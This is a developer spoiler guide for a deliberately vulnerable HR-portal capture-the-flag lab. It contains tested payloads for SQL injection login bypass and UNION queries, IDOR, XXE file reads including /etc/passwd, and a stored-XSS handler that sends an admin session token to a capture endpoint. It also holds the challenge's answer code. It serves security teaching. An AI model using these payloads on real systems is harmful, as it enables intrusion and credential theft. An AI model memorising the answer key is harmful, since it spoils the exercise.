# Solstice PeopleHub — Challenge Guide

Developer/maintainer reference: the complete task list, a fully verified solve walkthrough with
exact payloads, a tiered hint system for stuck players, and the system architecture. Everything in
this document was tested against the live application, not written from memory.

**This is a spoiler document.** See [../README.md](../README.md) for the player-facing orientation.

---

## 1. Where this sits in the outer game

```
Login → Exhibit A → Stage 2 → Exhibit B → STAGE 3 / EXHIBIT C (this document) → Stage 4 → Stage 5 → Stage 6 → Epilogue
```

Reaching Exhibit C requires `stage3 = true` on the outer session (solve Exhibit B first). Exhibit
C's own completion requires two things, checked by `POST /api/exhibit-c`:

1. **`investigation`** — all nine PeopleHub sub-flags below are true (`stage3_complete` in
   `challenge_state`, keyed by the outer session token).
2. **`code`** — the correct emergency access code, checked against `challenges.json`'s
   `exhibitC.fields.code` hash (unchanged from before this rebuild).

Both together set `solved3 = true` on the outer session and hand back `exhibitC.flag`, which
unlocks Stage 4.

---

## 2. Task list — the nine investigation flags

| # | Flag | Where | Class |
|---|---|---|---|
| 1 | `stage3_login` | PeopleHub login | SQL injection (authentication bypass) |
| 2 | `stage3_directory` | Employee Directory search | SQL injection (UNION) |
| 3 | `stage3_employee` | Employee Profile (`:id` lookup) | SQL injection (UNION) |
| 4 | `stage3_report` | People Analytics → Reports (segment filter) | SQL injection (UNION) |
| 5 | `stage3_request` | HR Requests search | SQL injection (UNION) |
| 6 | `stage3_document` | Documents (detail/download route) | Broken object-level authorization (IDOR) |
| 7 | `stage3_xxe` | Administration → Employee Data Import | XXE (external entity injection) |
| 8 | `stage3_xss` | Help & Support → Share Feedback with HR | Stored XSS |
| 9 | `stage3_emergency` | Security → Emergency Access | Business-logic bypass (break-glass code) |

None of these are shown to the player anywhere. `/api/exhibit-c` only ever returns the combined
`investigation` boolean. `/ctf-admin.html` (localhost-only) is the one place that shows the full
per-flag grid, for testing.

**Rough intended order** (not enforced — a strong player can jump around): login → directory →
profile → reports/requests (any order) → documents → import/XXE → feedback/XSS → emergency access
→ back to Exhibit C. The emergency-access code is only discoverable via the XXE chain, so flag 9
has a hard dependency on flag 7 even though nothing in the code enforces it.

---

## 3. Full solve walkthrough (verified)

Every payload below was run against the live server and confirmed working. Login accounts change
their *specific* employee identities on every reseed (the RNG is seeded, so the same seed always
produces the same data — but if you change `SEED_RNG_SEED` the specific names/IDs shift, though
the *techniques* below remain identical since they never depend on a specific value).

### 3.1 — Login (blind, then targeted escalation)

The login form (`POST /api/peoplehub/auth/login`) builds its query by string concatenation, no
filtering, no hints anywhere in the UI:

```js
SELECT u.user_id, u.username, u.role_id, u.employee_id, u.is_active, r.name AS roleName
FROM users u JOIN roles r ON r.role_id = u.role_id
WHERE u.username = '${username}' AND u.password_hash = '${password}' LIMIT 1
```

**Blind bypass** (proves the bug, but lands on a low-privilege account on purpose):

```
username: x
password: ' OR '1'='1' -- 
```

There's no `ORDER BY`, so `LIMIT 1` returns SQLite's natural row order — whichever account was
*inserted* first (`src/seed/generators/accounts.js` seeds Employee/Manager seats before
Administrator ones, specifically so this doesn't trivially grant admin).

**Escalation** — grab the highest-privilege real account directly, no prior knowledge of any
specific username or employee ID required:

```
username: ' UNION SELECT user_id,username,role_id,employee_id,1,(SELECT name FROM roles WHERE roles.role_id=users.role_id) FROM users ORDER BY role_id DESC LIMIT 1 -- 
password: x
```

This assumes a `users` table with a `role_id` foreign key to a `roles` table — a very standard
guess for anyone with SQLi experience, and confirmable by trial. The correlated subquery pulls the
*real* role name (`(SELECT name FROM roles WHERE roles.role_id = users.role_id)`); a hardcoded
placeholder string here would break the session's RBAC, since the role name — not the numeric ID —
is what the app checks capabilities against.

A simpler, cruder alternative that also works: brute-force `WHERE role_id = N` for `N` in `1..9`
(there are exactly 9 roles) and check `/api/peoplehub/me` after each attempt.

### 3.2 — Employee Directory

`GET /api/peoplehub/employees?search=...` — every dropdown filter is parameterized; `search` is
concatenated. The result set has **13 columns**: `employee_id, first_name, last_name,
preferred_name, job_title, department, managerFirst, managerLast, location, employment_type,
employment_status, join_date, job_grade`.

```
search: x' UNION SELECT 'x','x','x','x','x','x','x','x','x','x','x','x','x' -- 
```

(Requires the `directory` capability — HR Helpdesk, HR Manager, Payroll, IT Support, Security,
Manager, or Administrator. Escalate first if you're still on the blind-bypass Employee account.)

### 3.3 — Employee Profile

`GET /api/peoplehub/employees/:id` — the URL segment is concatenated into the WHERE clause. The
query is `SELECT e.*, d.name AS department`, i.e. every `employees` column (21) plus department
(**22 columns total**).

```
GET /api/peoplehub/employees/x' UNION SELECT 'x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x' -- 
```

### 3.4 — People Analytics → Reports

`GET /api/peoplehub/reports/:id/run?segment=...` — the segment filter is concatenated. Result
shape is **3 columns**: `dimension, metric_name, metric_value`.

```
segment: x' UNION SELECT 'x','x','x' -- 
```

Requires the `reports` capability.

### 3.5 — HR Requests

`GET /api/peoplehub/hr-requests?search=...` — same pattern as Directory, **9 columns**:
`request_id, employee_id, first_name, last_name, category, subject, priority, status,
created_at`. Unlike Directory's `where[0]`, there is **no extra wrapping paren** to close here.

```
search: x' UNION SELECT 'x','x','x','x','x','x','x','x','x' -- 
```

### 3.6 — Document IDOR

Documents → the list view is correctly scoped (your own documents + company-wide ones only) —
browsing normally never reveals the bug. The detail route
(`GET /api/peoplehub/documents/:id`) only checks classification→role access, never ownership, for
personal document types (Employment Contract, Compensation Letter, Performance Review, Leave
Approval, Onboarding, Offboarding, Benefits, Training).

As a **non**-admin, non-HR-manager account, request a document ID that isn't in your own list
(e.g. try IDs sequentially — `documents.html?id=1`, `?id=2`, …). Any personal document belonging
to someone else that comes back is the discovery.

### 3.7 — Employee Data Import (XXE)

Administration → Employee Data Import (Administrator-only). Real DOCTYPE/ENTITY parsing
(`src/lib/xxe.js`), sandboxed to `data/challenge-data/` on disk — never the real filesystem.

**Decoy** (confirms the technique works, teaches nothing sensitive):

```xml
<?xml version="1.0"?>
<!DOCTYPE employees [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<employee><name>Test</name><role>&xxe;</role><note>x</note></employee>
```

**The real chain** — one file at a time, each pointing to the next:

1. `file:///challenge-data/hr/migration-notes.txt` → mentions `hr/directory-sync.txt`
2. `file:///challenge-data/hr/directory-sync.txt` → mentions `config/import-settings.txt`
3. `file:///challenge-data/config/import-settings.txt` → mentions `archive/migration-history.txt`
4. `file:///challenge-data/archive/migration-history.txt` → **contains the emergency access
   code: `BLACKOUT-7`**

Payload shape (swap the `SYSTEM` identifier for each step):

```xml
<?xml version="1.0"?>
<!DOCTYPE employees [<!ENTITY xxe SYSTEM "file:///challenge-data/archive/migration-history.txt">]>
<employee><name>Test</name><role>Engineer</role><note>&xxe;</note></employee>
```

`challenge-data/reports/legacy-report.txt` is a dead-end decoy — old, superseded headcount data,
mentioned nowhere in the real chain.

### 3.8 — Stored XSS

Help & Support → "Share Feedback with HR". The review-queue preview renders submissions via
`innerHTML`, unescaped. `window.__ADMIN_SESSION_TOKEN__` is loaded on that page only. Plain
`<script>` tags don't execute via `innerHTML`; an event handler does:

```html
<img src=x onerror="fetch('/api/peoplehub/feedback/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:window.__ADMIN_SESSION_TOKEN__})})">
```

Submit it, and it renders (and fires) immediately in your own browser's preview — this lab
simulates "an admin views it" by rendering the same unescaped queue back to the submitter, since a
real second-admin-session demo isn't practical here.

### 3.9 — Emergency Access

Security → Emergency Access. Submit a request with the code found in step 3.7:

```
Reason: (anything)
Access Type: (any)
Duration: (any)
Emergency Access Code: BLACKOUT-7
```

Case-insensitive, compared with `crypto.timingSafeEqual`. Accepted → the request skips straight to
`HR Approved`, bypassing the normal Manager → Security → HR chain.

### 3.10 — Exhibit C

Back on the case file page, answer: *"What emergency access code was contained in the internal HR
migration documentation?"* → `BLACKOUT-7`. Combined with all nine flags true, this completes Stage
3 and reveals the flag.

---

## 4. Tiered hints

Three tiers per task — hand out progressively to a stuck player. Tier 3 stops short of the exact
payload; pair it with the walkthrough above if you need the literal string.

| Task | Tier 1 (nudge) | Tier 2 (names it) | Tier 3 (near-spoiler) |
|---|---|---|---|
| Login | The login form doesn't behave like a normal one under unusual input. Try something a normal password never contains. | This is a classic SQL injection authentication bypass. | A quote character breaks the query. Comment out the rest of it. Whoever you land on might not be who you want — look at what that account can actually see. |
| Escalation | Logging in got you *somewhere*, but not very far. There's a smarter way to pick who you become. | The same injection point can target a specific row, not just "any row." | `UNION SELECT` from the same table the login checks, ordered by whatever column represents privilege, `LIMIT 1`. |
| Directory | The search box behaves oddly with certain characters. | UNION-based SQL injection; count the columns the search results show you. | Close the string, close the grouping, `UNION SELECT` matching the same number of columns, comment out the rest. |
| Employee Profile | The URL for a profile carries an identifier. What happens if it's not a normal one? | Same technique as Directory, different injection point (the ID itself), more columns. | It's every column on the employee record plus one joined column — count carefully. |
| Reports | A report lets you narrow results to "one segment." What if that filter isn't validated the way you'd expect? | UNION injection again — small result shape this time. | Three columns: a dimension, a metric name, a metric value. |
| HR Requests | HR staff can search requests by more or less anything. Push on that. | Same class of bug as Directory — but check the query shape carefully, it's not identical. | Nine columns, and — unlike Directory — you don't need an extra closing parenthesis. |
| Documents | Browsing the document list looks properly locked down. Does *every* way of reaching a document go through that same check? | This is an authorization bug, not an injection — IDOR. | The detail page only checks what *kind* of document it is, not who it *belongs* to. Try IDs that aren't in your own list. |
| Import / XXE | The bulk import feature parses XML. What else can XML do besides hold data? | XXE — external entity injection. There's a whole synthetic filesystem to explore, not just one file. | Start with the migration notes. Follow what each file tells you to look at next. |
| Feedback / XSS | A feedback box that "previews" what you type is doing more than styling it. | Stored XSS — the preview isn't escaping your input. | `<script>` won't fire this way. An image with a broken source and an error handler will. There's a token sitting in a global variable on that page. |
| Emergency Access | This page has an approval chain — and a field that doesn't obviously connect to anything else in the app. | It's not a bug in the code, it's a workflow that still honors an old, undocumented shortcut. | You've already found a code somewhere else in this investigation. Try it here. |

---

## 5. System architecture

### 5.1 Request lifecycle

```
Browser
  │
  ▼
src/server.js  (single vanilla http.createServer, no framework)
  │
  ├─ /api/login, /api/resume, /api/progress, /api/exhibit-*, ...   → outer CTF game (unchanged)
  │
  ├─ /api/peoplehub/*   → requires outer session with stage3=true
  │                        → src/lib/peoplehub/router.js (handle)
  │                             → requires PeopleHub's OWN session (phsid cookie)
  │                             → routes/*.js handlers, RBAC-checked (src/lib/peoplehub/rbac.js)
  │                             → src/lib/peoplehub/db.js (one persistent sqlite connection)
  │
  ├─ /api/ctf-admin/*   → requires loopback connection only (no session of any kind)
  │                        → src/lib/peoplehub/router.js (handleAdmin)
  │
  └─ everything else (incl. all /peoplehub/*.html) → static file serving (public/)
```

Two completely independent session layers stack on top of each other:

- **Outer session** (`sid` cookie, in-memory `Map` in `server.js`) — gates the whole game's
  progression (`stage1`…`stage6`, `solved1`…`solved6`). PeopleHub is unreachable at all without
  `stage3 = true` here.
- **PeopleHub session** (`phsid` cookie, in-memory `Map` in `src/lib/peoplehub/session.js`) — a
  completely separate login, modeling "this browser is signed into the HR platform." Carries
  `userId`, `employeeId`, `roleId`, `roleName`. Knows nothing about challenge progress.

Challenge progress (`challenge_state` table, in the PeopleHub *database*, not in either session
object) is keyed by the **outer** session's token, specifically so a player can log out and back
into PeopleHub — or even escalate from one PeopleHub account to another — without losing progress
within the same outer-game run.

### 5.2 Directory map

```
src/
  server.js                      outer game (~1000 lines) + PeopleHub mount points

  lib/
    normalize.js, forensics.js,    outer game helpers (untouched)
    hrdb.js, xxe.js                outer game's Stage-4 XXE lab (untouched, still live)
    peoplehub/
      db.js                        persistent sqlite connection (open once, closeDb() for reseed)
      session.js                   PeopleHub login sessions (phsid)
      rbac.js                      9-role capability matrix
      helpers.js                   requirePhAuth / fail / pagination shared by routes/*.js
      challengeState.js            9-flag progress tracking, keyed by OUTER session token
      router.js                    dispatcher; also auth/dashboard/directory/profile/org/search/
                                    meta/notifications handlers inline; handleAdmin for /ctf-admin
      routes/
        timepay.js                 Leave & Attendance, Payroll
        documents.js                Documents (list safe, detail = IDOR)
        requests.js                 HR Requests (SQLi), IT Tickets (safe)
        reports.js                   Reports (SQLi)
        recruitment.js                Job Openings, Candidates, Applications
        training.js                   Courses, Enrollments
        comms.js                       Announcements, Policies
        audit.js                        Audit Logs, Security Events
        admin.js                         Users, Roles, Departments, Import Jobs (Administration)
        importxml.js                      Employee Data Import (XXE)
        feedback.js                        HR Feedback (stored XSS)
        emergency.js                        Emergency Access (business-logic bypass)

  seed/
    config.js                      SEED_* env-overridable data volumes
    data/                          names.js, org.js, catalog.js -- reference vocabularies
    lib/rng.js                     seeded PRNG (mulberry32) -- deterministic, not Math.random
    generators/                    one file per domain; each populates its own table(s)
    seed.js                        orchestrator: wipes + rebuilds data/db/peoplehub.sqlite
    outer-seed.js                  orchestrator: wipes + rebuilds data/users.json + data/challenges.json

data/
  db/
    schema.sql                     25 tables, FKs, indexes
    peoplehub.sqlite                (generated, not committed logic -- rebuild with the seed script)

  challenge-data/                  XXE lab's synthetic filesystem (real files, read-only, on disk)
    hr/migration-notes.txt
    hr/directory-sync.txt
    config/import-settings.txt
    reports/legacy-report.txt      (decoy)
    archive/migration-history.txt  (contains BLACKOUT-7)

  evidence/                        outer game's downloadable evidence files (generated)
  users.json, challenges.json      outer game's user store + all exhibit answers (generated)

public/
  index.html, map.html, exhibit-*.html, gate-*.html, stage2.html, epilogue.html, hr-portal.html
                                  outer game pages (hr-portal.html now orphaned -- no longer
                                  linked from exhibit-c.html, but left intact and functional)
  ctf-admin.html                 dev-only reset/inspection panel (loopback-gated)
  peoplehub/
    shared/
      api.js                     fetch wrapper (401 -> redirect to login, except where suppressed)
      shell.js                   builds sidebar + header from data; every page calls
                                  PeopleHubShell.init({active, title})
      shell.css                  design system (CSS variables match the brief's color spec)
      table.js                   generic paginated/sortable/filterable data table
    login.html/js, dashboard.html/js, employees.html/js, employee-profile.html/js,
    organization.html/js, people-analytics.html/js, leave.html/js, payroll.html/js,
    documents.html/js, hr-requests.html/js, it-requests.html/js, reports.html/js,
    recruitment.html/js, training.html/js, announcements.html/js, policies.html/js,
    benefits.html, performance.html/js, administration.html/js, import.html/js,
    emergency-access.html/js, settings.html, help.html/js, profile.html
                                  23 pages total, one HTML+JS pair each (except the two purely
                                  static ones), sharing shared/*
```

### 5.3 Database schema (relationships)

```
departments ─┬─< employees >──── manager_id (self-referential)
             │        │
             │        ├──< employee_profiles (1:1)
             │        ├──< payroll (1:1)
             │        ├──< leave_records
             │        ├──< performance_reviews (also reviewer_id → employees)
             │        ├──< documents (owner, nullable) ──< document_access >── roles
             │        ├──< hr_requests / it_tickets (also assigned_to → employees)
             │        ├──< training_enrollments >── training_courses
             │        ├──< notifications
             │        ├──< security_events
             │        ├──< emergency_access_requests (requested_by + 3 approver FKs, all
             │        │     → employees)
             │        └──< interviews (interviewer_id → employees)
             │
             └──< job_openings ──< applications >── candidates
                                        └──< interviews

users ──> roles (role_id), employees (employee_id, nullable)
audit_logs ──> users (user_id, nullable -- system actions)
reports ──< report_results
import_jobs                       (no FK -- standalone log)
challenge_state                   (session_key = outer game's session token, not an FK)
```

### 5.4 Role capability matrix

See [`../src/lib/peoplehub/rbac.js`](../src/lib/peoplehub/rbac.js) for the authoritative version (this is what
every route handler actually checks — never the frontend nav, which just hides links a role can't
use).

| Role | directory | anyProfile | teamProfiles | payroll | reports | hrAdmin | itAdmin | recruitment | audit | security | admin | emergencyApprove |
|---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| Employee | | | | | | | | | | | | |
| Manager | ✓ | | ✓ | | | | | | | | | ✓ |
| HR Helpdesk | ✓ | ✓ | | | | | | | | | | |
| HR Manager | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | | ✓ | | | | ✓ |
| Recruiter | ✓ | | | | | | | ✓ | | | | |
| Payroll | ✓ | | | ✓ | ✓ | | | | | | | |
| IT Support | ✓ | | | | | | ✓ | | | | | |
| Security | ✓ | ✓ | | | ✓ | | | | ✓ | ✓ | | ✓ |
| Administrator | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

### 5.5 Why a few things are built the way they are

- **One persistent sqlite connection, not per-request.** The original hr-portal.html lab rebuilt
  an in-memory database on every single call — fine for a handful of rows, dead on arrival at
  1,000+ employees / 2,000+ audit rows. `src/lib/peoplehub/db.js` opens once at first use and is
  reused; `closeDb()` exists solely so `/ctf-admin.html`'s reset button can hand the file back to
  the seed script without a server restart.
- **List queries fetch everything and paginate in JS, for the vulnerable endpoints specifically.**
  A separate `COUNT(*)` query plus a paginated `SELECT` have *different column counts* — a UNION
  payload sized to satisfy one breaks the other, since they run in sequence and the first failure
  wins. Collapsing to one unbounded query, sliced in application code, means there's only one
  query shape a payload ever needs to match. (Documents' list view doesn't have this problem
  because it isn't meant to be injectable — its `search` is properly parameterized.)
- **Discovery flags are content-based, not shape-based, where it matters.** SQLite UNION always
  keeps the *first* SELECT's column names, regardless of what the injected SELECT actually
  returns — so checking `'columnName' in row` can never detect a UNION injection. Reports and HR
  Requests check the actual *values* instead (is `metric_value` a real number? does `employee_id`
  match the `SD-#####` format?).
- **Seed insertion order controls the login bypass's blast radius.** `LIMIT 1` with no `ORDER BY`
  returns whichever row SQLite naturally encounters first — insertion order, for an unmodified
  table. Employee/Manager seats are seeded before Administrator ones specifically so the
  five-second blind payload doesn't also happen to be the fastest way to full admin.

---

## 6. Resetting for a fresh run

See [../README.md § Resetting](../README.md#resetting) — `/ctf-admin.html` (localhost only) for a live,
no-restart reset, or `npm run seed:peoplehub` from the command line (stop the server first on
Windows; SQLite file locking).
